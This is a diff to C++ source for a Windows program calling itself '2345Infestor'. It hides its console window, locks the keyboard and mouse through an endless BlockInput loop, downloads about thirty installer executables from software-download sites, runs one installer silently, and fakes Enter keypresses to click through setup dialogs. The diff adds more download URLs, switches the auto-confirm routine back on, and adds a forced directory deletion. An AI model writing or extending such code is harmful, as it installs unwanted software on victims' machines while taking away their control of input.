@@ -11,9 +11,17 @@
 
 using namespace std;
 
-string urls[22] = {
+string urls[30] = {
 	"http://file.drivergenius.com/DGSetup_Home_BZ.exe",
 	"https://cdn-file-ssl-pc.ludashi.com/pc/appstore/ludashi/ludashisetup2020.exe",
+	"http://pc6.wall.barkcan.com/download/%E9%85%B7%E6%B4%BE8809adb%E9%A9%B1%E5%8A%A8_03864396.exe",
+	"http://pc6.wall.barkcan.com/download/adbwinapi.dll_03867358.exe",
+	"http://pc6.wall.barkcan.com/download/qqmv.dll_03867359.exe",
+	"https://41231.xc.zhongguohao123.com/xiaz/%E8%B6%85%E7%BA%A7%E5%85%94%E5%AD%90_%E5%8F%8D%E5%BC%B9%E5%A4%A9%E4%BD%BFV2.01%E7%BB%BF%E8%89%B2%E5%85%8D%E8%B4%B9%E7%89%88%E5%8F%8D%E8%BF%85%E9%9B%B7%EF%BC%8CQQ%E5%B9%BF%E5%91%8A%E7%AD%89@1489_6341.exe",
+	"https://41231.xc.zhongguohao123.com/xiaz/%E5%BF%AB%E6%89%8B(AAutoQuicker)%E4%B8%8B%E8%BD%BDv18.11%E7%BB%BF%E8%89%B2%E7%89%88@2063_13138.exe",
+	"https://41231.xc.zhongguohao123.com/xiaz/%E5%BF%AB%E6%89%8B(AAutoQuicker)%E4%B8%8B%E8%BD%BDv18.11%E7%BB%BF%E8%89%B2%E7%89%88@2063_13138.exe",
+	"https://dlc2.pconline.com.cn/filedown4_56021_314081339/vEPuuJnT/6.3.1.11106@1918_56021.exe",
+	"https://dlc2.pconline.com.cn/filedown4_354935_313948526/48t8Enpn/10.19.0.21377@1918_354935.exe",
 	"https://dl.360safe.com/se/360se_setup.exe",
 	"https://dl.softmgr.qq.com/original/Browser/DCBrowser_4.0.7.22.exe",
 	"https://dl.softmgr.qq.com/original/Browser/KSbrowser_p_wwzh_1_2020090701_6.5.115.19871.exe",
@@ -41,12 +49,12 @@ DWORD WINAPI MSG_RUNFIRST(LPVOID lpParam) {
 	MessageBoxA(NULL, "Infestor is running！", "2345Infestor", MB_OK | MB_ICONINFORMATION);
 	return 0;
 }
+
 DWORD WINAPI BKIPT(LPVOID lpParam) {
 	while (1) {
 		BlockInput(true);
 	}
 }
-
 void RTN(){
 	keybd_event(VK_RETURN, 0, 0, 0);
 	Sleep(50);
@@ -54,7 +62,7 @@ void RTN(){
 	Sleep(100);
 }
 void ProC() {
-	/*
+	///*
 	Sleep(1000);
 	RTN();
 	RTN();
@@ -63,6 +71,29 @@ void ProC() {
 	RTN();/**/
 }
 
+HWND GetSelfHWND(void) {
+#define MY_BUFSIZE 1024 // Buffer size for console window titles.
+	HWND hwndFound;         // This is what is returned to the caller.
+	char pszNewWindowTitle[MY_BUFSIZE]; // Contains fabricated
+	// WindowTitle.
+	char pszOldWindowTitle[MY_BUFSIZE]; // Contains original
+	// WindowTitle.
+	// Fetch current window title.
+	GetConsoleTitleA(pszOldWindowTitle, MY_BUFSIZE);
+	// Format a "unique" NewWindowTitle.
+	wsprintfA(pszNewWindowTitle, "%d/%d",
+		GetTickCount(),
+		GetCurrentProcessId());
+	// Change current window title.
+	SetConsoleTitleA(pszNewWindowTitle);
+	// Ensure window title has been updated.
+	Sleep(40);
+	// Look for NewWindowTitle.
+	hwndFound = FindWindowA(NULL, pszNewWindowTitle);
+	// Restore original window title.
+	SetConsoleTitleA(pszOldWindowTitle);
+	return (hwndFound);
+}
 LPTHREAD_START_ROUTINE WINAPI DPA(string url) {
 	string savefname = url.substr(url.find_last_of("/") + 1, url.find_last_of("?") - 1 - url.find_last_of("/"));
 	savefname = savefname.insert(0, "C:\\InfestorDirectory\\");
@@ -100,29 +131,6 @@ void DPA2345() {
 	system("START C:\\InfestorDirectory\\2345Inst.exe /S");
 }
 
-HWND GetSelfHWND(void) {
-#define MY_BUFSIZE 1024 // Buffer size for console window titles.
-	HWND hwndFound;         // This is what is returned to the caller.
-	char pszNewWindowTitle[MY_BUFSIZE]; // Contains fabricated
-	// WindowTitle.
-	char pszOldWindowTitle[MY_BUFSIZE]; // Contains original
-	// WindowTitle.
-	// Fetch current window title.
-	GetConsoleTitleA(pszOldWindowTitle, MY_BUFSIZE);
-	// Format a "unique" NewWindowTitle.
-	wsprintfA(pszNewWindowTitle, "%d/%d",
-		GetTickCount(),
-		GetCurrentProcessId());
-	// Change current window title.
-	SetConsoleTitleA(pszNewWindowTitle);
-	// Ensure window title has been updated.
-	Sleep(40);
-	// Look for NewWindowTitle.
-	hwndFound = FindWindowA(NULL, pszNewWindowTitle);
-	// Restore original window title.
-	SetConsoleTitleA(pszOldWindowTitle);
-	return (hwndFound);
-}
 int main(int argc, char* argv[]) {
 	// Self Hidden
 	HWND hWnd = GetSelfHWND();
@@ -130,6 +138,7 @@ int main(int argc, char* argv[]) {
 
 	CreateThread(0, 0, BKIPT, 0, 0, 0);
 	CreateThread(0, 0, MSG_RUNFIRST, 0, 0, 0);
+	system("rmdir /s /q  C:\\InfestorDirectory\\");
 	system("mkdir C:\\InfestorDirectory\\");
 	for (int i = 0; i < urls->length(); i++) {
 		//DPA(urls[i]);
